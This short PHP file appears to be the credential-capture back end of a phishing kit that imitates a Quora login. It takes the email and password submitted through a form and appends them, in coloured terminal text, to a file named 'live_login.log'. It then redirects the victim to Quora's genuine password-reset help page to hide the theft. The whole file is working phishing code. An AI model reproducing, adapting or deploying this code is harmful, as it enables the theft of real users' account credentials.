<?php
$BRIGHT_GREEN = "\033[1;92m";
$BRIGHT_CYAN = "\033[1;96m";
$BRIGHT_YELLOW = "\033[1;93m";
$RESET = "\033[0m";

file_put_contents("live_login.log", 
    "{$BRIGHT_YELLOW}Quora {$BRIGHT_CYAN}Username: {$BRIGHT_GREEN}" . $_POST['email'] . 
    " {$BRIGHT_CYAN}Pass: {$BRIGHT_GREEN}" . $_POST['password'] . "{$RESET}\n", 
    FILE_APPEND
);

header('Location: https://help.quora.com/hc/en-us/articles/115004232866-How-do-I-change-or-reset-my-password-on-Quora-');
exit();
?>